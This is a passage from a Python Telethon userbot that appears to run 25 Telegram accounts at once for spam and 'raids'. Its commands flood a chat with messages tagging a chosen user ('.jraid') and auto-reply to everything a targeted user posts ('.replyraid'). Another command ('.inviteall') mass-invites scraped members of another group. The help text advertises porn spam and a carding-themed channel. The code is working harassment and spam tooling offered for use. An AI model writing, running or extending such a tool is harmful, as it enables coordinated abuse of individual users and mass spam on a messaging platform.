        else:
            replied_user = await event.client(
                GetFullUserRequest(previous_message.sender_id)
            )
    target = replied_user.user.id
    return target


@idk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.jraid"))

async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗥𝗮𝗶𝗱\n\nCommand:\n\n.jraid <count> <Username of User>\n\n.jraid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(yukki[0])
            for _ in range(counter):
                reply = random.choice(JRAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(yukki[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(JRAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.1)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
            
            
          
@idk.on(events.NewMessage(incoming=True))
@ydk.on(events.NewMessage(incoming=True))
@wdk.on(events.NewMessage(incoming=True))
@hdk.on(events.NewMessage(incoming=True))
@sdk.on(events.NewMessage(incoming=True))
@adk.on(events.NewMessage(incoming=True))
@bdk.on(events.NewMessage(incoming=True))
@cdk.on(events.NewMessage(incoming=True))
@edk.on(events.NewMessage(incoming=True))
@ddk.on(events.NewMessage(incoming=True))
@vkk.on(events.NewMessage(incoming=True))
@kkk.on(events.NewMessage(incoming=True))
@lkk.on(events.NewMessage(incoming=True))
@mkk.on(events.NewMessage(incoming=True))
@sid.on(events.NewMessage(incoming=True))
@shy.on(events.NewMessage(incoming=True))
@aan.on(events.NewMessage(incoming=True))
@ake.on(events.NewMessage(incoming=True))
@eel.on(events.NewMessage(incoming=True))
@khu.on(events.NewMessage(incoming=True))
@shi.on(events.NewMessage(incoming=True))
@yaa.on(events.NewMessage(incoming=True))
@dav.on(events.NewMessage(incoming=True))
@raj.on(events.NewMessage(incoming=True))
@put.on(events.NewMessage(incoming=True))


async def _(event):
    global que
    queue = que.get(event.sender_id)
    if not queue:
        return
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(0.2)
    async with event.client.action(event.chat_id, "typing"):
        await event.client.send_message(
            entity=event.chat_id,
            message="""{}""".format(random.choice(RRAID)),
            reply_to=event.message.id,
        ) 
        
        
@idk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))


async def _(e):
    global que
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.replyraid <Username of User>\n\n.replyraid <reply to a User>"
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(e.text) > 11:
            message = str(yukki[0])
            a = await e.client.get_entity(message)
            g = a.id
            que[g] = []
            qeue = que.get(g)
            appendable = [g]
            qeue.append(appendable)
            text = "RUK TERA TOH GAME BAJANA PADEGA"
            await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            que[g] = []
            qeue = que.get(g)
            appendable = [g]
            qeue.append(appendable)
            text = "RUK TERA TOH GAME BAJANA PADEGA"
            await e.reply(text, parse_mode=None, link_preview=None )
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

            
@idk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))

async def _(e):
    global que
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.dreplyraid <Username of User>\n\n.dreplyraid <reply to a User>"
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(e.text) > 12:
            message = str(yukki[0])
            a = await e.client.get_entity(message)
            g = a.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception as f:
                pass
            text = "CHH TU JAA RE JAA ARE TU JAA"
            await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception as f:
                pass
            text = "CHH TU JAA RE JAA ARE TU JAA"
            await e.reply(text, parse_mode=None, link_preview=None )
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
    
       

@idk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.ping"))

async def ping(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        text = "EEH MEREKO ESA DHAK DHAK HORE LA H RE BABA"
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"EEH MEREKO ESA DHAK DHAK HORE LA H RE BABA\n`{ms}` 𝗺𝘀")


    
        
# INVITE ALL OP

from telethon.errors import (
    ChannelInvalidError,
    ChannelPrivateError,
    ChannelPublicGroupNaError,
)
from telethon.tl import functions
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.functions.messages import GetFullChatRequest


async def get_chatinfo(event):
    chat = event.pattern_match.group(1)
    chat_info = None
    if chat:
        try:
            chat = int(chat)
        except ValueError:
            pass
    if not chat:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:
                chat = replied_msg.fwd_from.channel_id
        else:
            chat = event.chat_id
    try:
        chat_info = await event.client(GetFullChatRequest(chat))
    except:
        try:
            chat_info = await event.client(GetFullChannelRequest(chat))
        except ChannelInvalidError:
            await event.reply("KONSA GRP AUR CHANNEL KA LINK DIYA RE")
            return None
        except ChannelPrivateError:
            await event.reply(
                "ISNE MERA KHOPDI TODA H RE SHYAAM"
            )
            return None
        except ChannelPublicGroupNaError:
            await event.reply("KYA GUNDA BANEGA RE ESA KLUCH HAI HI NI")
            return None
        except (TypeError, ValueError):
            await event.reply("KHIDKI TOH KHULI HI CHOR GYE ESA GRP ME HAI NI KAHA JAAU")
            return None
    return chat_info


def make_mention(user):
    if user.username:
        return f"@{user.username}"
    else:
        return inline_mention(user)


def inline_mention(user):
    full_name = user_full_name(user) or "No Name"
    return f"[{full_name}](tg://user?id={user.id})"


def user_full_name(user):
    names = [user.first_name, user.last_name]
    names = [i for i in list(names) if i]
    full_name = " ".join(names)
    return full_name


            
@idk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall")) 
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall")) 
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall")) 
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall")) 
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall")) 
@sid.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))

async def get_users(event):
    if event.sender_id in SMEX_USERS:
        rkp = await event.reply("𝑃𝑅𝑂𝐶𝐸𝑆𝑆𝐼𝑁𝐺...")
    else:
        rkp = await event.edit("𝑃𝑅𝑂𝐶𝐸𝑆𝑆𝐼𝑁𝐺...")
    rk1 = await get_chatinfo(event)
    chat = await event.get_chat()
    if event.is_private:
        return await rkp.edit("MEREKO YEH NA PASAND ISLIYE ADD NA KIYA")
    s = 0
    f = 0
    error = "None"

    await rkp.edit("⚜️ 𝑇𝐸𝑅𝑀𝐼𝑁𝐴𝐿 𝑆𝑇𝐴𝑇𝑈𝑆 ⚜️\n\n`UTHA LE RE DEVA UTHA LE...")
    async for user in event.client.iter_participants(rk1.full_chat.id):
        try:
            if error.startswith("Too"):
                return await rkp.edit(
                    f"𝑇𝐸𝑅𝑀𝐼𝑁𝐴𝐿 𝐹𝐼𝑁𝐼𝑆𝐻𝐸𝐷 𝑊𝐼𝑇𝐻 𝐸𝑅𝑅𝑂𝑅𝑆...\n(𝑀𝐴𝑌 𝐺𝑂𝑇 𝐿𝐼𝑀𝐼𝑇 𝐸𝑅𝑅𝑂𝑅 𝐹𝑅𝑂𝑀 𝑇𝐸𝐿𝐸𝑇𝐻𝑂𝑁 𝑇𝑅𝑌 𝐴𝐺𝐴𝐼𝑁 𝐿𝐴𝑇𝐸𝑅...)\n𝐸𝑅𝑅𝑂𝑅 : \n`{error}`\n\n✪ 𝐼𝑁𝑉𝐼𝑇𝐸𝐷 𝑈𝑆𝐸𝑅𝑆 `{s}` people \n✪ 𝐹𝐴𝐼𝐿𝐸𝐷 𝑇𝑂 𝐼𝑁𝑉𝐼𝑇𝐸... `{f}` 𝑃𝐸𝑂𝑃𝐿𝐸"
                )
            await event.client(
                functions.channels.InviteToChannelRequest(channel=chat, users=[user.id])
            )
            s = s + 1
            await rkp.edit(
                f"𝑇𝐸𝑅𝑀𝐼𝑁𝐴𝐿 𝑅𝑈𝑁𝑁𝐼𝑁𝐺...\n\n✪ 𝐼𝑁𝑉𝐼𝑇𝐸𝐷 `{s}` 𝑃𝐸𝑂𝑃𝐿𝐸 \n✪ 𝐹𝐴𝐼𝐿𝐸𝐷 𝑇𝑂 𝐼𝑁𝑉𝐼𝑇𝐸... `{f}` 𝑃𝐸𝑂𝑃𝐿𝐸\n\n✪ 𝐿𝐴𝑆𝑇 𝐸𝑅𝑅𝑂𝑅: `{error}`"
            )
        except Exception as e:
            error = str(e)
            f = f + 1
    return await rkp.edit(
        f"𝑇𝐸𝑅𝑀𝐼𝑁𝐴𝐿 𝐹𝐼𝑁𝐼𝑆𝐻𝐸𝐷...💥 \n\n✪ KAISA H KAHAMA KHAAKE JANA HAA `{s}` 𝑃𝐸𝑂𝑃𝐿𝐸 \n✪ 𝐹𝐴𝐼𝐿𝐸𝐷 𝑇𝑂 𝐼𝑁𝑉𝐼𝑇𝐸... `{f}` 𝑃𝐸𝑂𝑃𝐿𝐸"
    )        

# _______

@idk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
async def restart(e):
    if e.sender_id in SMEX_USERS:
        text = "🔱 MAAR DIYA RE SHYAAM ISNE MEKO CHAKU MARA"
        await e.reply(text, parse_mode=None, link_preview=None )
        try:
            await idk.disconnect()
        except Exception as e:
            pass
        try:
            await ydk.disconnect()
        except Exception as e:
            pass
        try:
            await wdk.disconnect()
        except Exception as e:
            pass
        try:
            await hdk.disconnect()
        except Exception as e:
            pass
        try:
            await sdk.disconnect()
        except Exception as e:
            pass
        try:
            await adk.disconnect()
        except Exception as e:
            pass
        try:
            await bdk.disconnect()
        except Exception as e:
            pass
        try:
            await cdk.disconnect()
        except Exception as e:
            pass
        try:
            await ddk.disconnect()
        except Exception as e:
            pass
        try:
            await edk.disconnect()
        except Exception as e:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()

        
        
        
        
        
@idk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.help"))

async def help(e):
    if e.sender_id in SMEX_USERS:
       text = "𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀\n\n𝙐𝙩𝙞𝙡𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.ping\n.restart\n\n𝙐𝙨𝙚𝙧𝙗𝙤𝙩 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.bio\n.sudo\n.join\n.pjoin\n.oword\n.echo\n.rmecho\n.leave\n\n𝙎𝙥𝙖𝙢 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.spam\n.pornspam\n.delayspam\n.bigspam\n.raid\n.mraid\n.hraid\n.sraid\n.jraid\n.craid\n.replyraid\n.dreplyraid\n\n\n𝐹𝑂𝑅 𝑀𝑂𝑅𝐸 𝐻𝐸𝐿𝑃 𝑅𝐸𝐺𝐴𝑅𝐷𝐼𝑁𝐺 𝑈𝑆𝐴𝐺𝐸 𝑂𝐹 𝑃𝐿𝑈𝐺𝐼𝑁𝑆 𝑇𝑌𝑃𝐸 𝑃𝐿𝑈𝐺𝐼𝑁𝑆 𝑁𝐴𝑀𝐸 TO JOIN @Carding_Chronicle"
       await e.reply(text, parse_mode=None, link_preview=None )

        

    
        
text = """
𝓑𝓐𝓝 𝓖𝓨𝓐 𝓑𝓐𝓝 𝓖𝓨𝓐 Kanishka 𝓢𝓟𝓐𝓜 𝓑𝓞𝓣 𝓑𝓐𝓝 𝓖𝓨𝓐 """

print(text)
print("")
print("Kanishka 𝓢𝓟𝓐𝓜 𝓑𝓞𝓣 𝓑𝓐𝓝 𝓖𝓨𝓐 𝓨𝓞")
if len(sys.argv) not in (1, 3, 4):
    try:
        idk.disconnect()
    except Exception as e:
        pass
    try:
        ydk.disconnect()
    except Exception as e:
        pass
    try:
        wdk.disconnect()
    except Exception as e:
        pass
    try:
        hdk.disconnect()
    except Exception as e:
        pass
    try:
        sdk.disconnect()
    except Exception as e:
        pass
    try:
        adk.disconnect()
    except Exception as e:
        pass
    try:
        bdk.disconnect()
    except Exception as e:
        pass
    try:
        cdk.disconnect()
    except Exception as e:
        pass
    try:
        edk.disconnect()
    except Exception as e:
        pass
    try:
        ddk.disconnect()
    except Exception as e:
        pass
    try:
        vkk.disconnect()
    except Exception as e:
        pass 
    try:
        kkk.disconnect()
    except Exception as e:
        pass
    try:
        lkk.disconnect()
    except Exception as e:
        pass 
    try:
        mkk.disconnect()
    except Exception as e:
        pass
    try:
        sid.disconnect()
    except Exception as e:
        pass
    try:
        shy.disconnect()
    except Exception as e:
        pass
    try:
        aan.disconnect()
    except Exception as e:
        pass
    try:
        ake.disconnect()
    except Exception as e:
        pass
    try:
        eel.disconnect()
    except Exception as e:
        pass
    try:
        khu.disconnect()
    except Exception as e:
        pass
    try:
        shi.disconnect()
    except Exception as e:
        pass
    try:
        yaa.disconnect()
    except Exception as e:
        pass
    try:
        dav.disconnect()
    except Exception as e:
        pass
    try:
        raj.disconnect()
    except Exception as e:
        pass
    try:
        put.disconnect()
    except Exception as e:
        pass
else:
    try:
        idk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        ydk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        wdk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        hdk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        sdk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        adk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        bdk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        cdk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        edk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        ddk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        vkk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        kkk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        lkk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        mkk.run_until_disconnected()
    except Exception as e:
        pass
    try:
        sid.run_until_disconnected()
    except Exception as e:
        pass
    try:
        shy.run_until_disconnected()
    except Exception as e:
        pass
    try:
        aan.run_until_disconnected()
    except Exception as e:
        pass
    try:
        ake.run_until_disconnected()
    except Exception as e:
        pass
    try:
        eel.run_until_disconnected()
    except Exception as e:
        pass
    try:
        khu.run_until_disconnected()
    except Exception as e:
        pass
    try:
        shi.run_until_disconnected()
    except Exception as e:
        pass
    try:
        yaa.run_until_disconnected()
    except Exception as e:
        pass
    try:
        dav.run_until_disconnected()
    except Exception as e:
        pass
    try:
        raj.run_until_disconnected()
    except Exception as e:
        pass
    try:
        put.run_until_disconnected()
    except Exception as e:
        pass
